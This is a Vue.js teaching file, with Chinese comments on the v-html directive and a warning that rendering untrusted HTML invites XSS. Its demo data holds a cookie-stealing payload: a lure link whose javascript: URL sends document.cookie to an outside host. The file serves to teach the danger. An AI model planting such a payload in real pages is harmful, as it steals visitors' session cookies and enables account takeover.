<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>v-text指令</title>
  <script src="../js/vue.js"></script>
</head>
<!-- 
  v-html指令:
    1.作用: 向指定节点中渲染包含HTML结构的内容
    2.与插值语法的区别
      (1).v-html会替换掉节点中所有的内容,{{xxx}}则不会
      (2).v-html可以识别html结构
      
    3.严重注意:v-html有安全性问题!!
      (1).在网站上动态渲染任何HTML是非常危险的，容易导致XSS攻击
      (2).一定要在可信的内容上使用v-html,永远不要在用户提交的内容上使用！！
 -->
<div id="root">
  <div v-html="msg"></div>

</div>

<body>

</body>
<script>
  Vue.config.productionTip = false
  new Vue({
    el: '#root',
    data: {
      msg: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
    }
  })
</script>

</html>
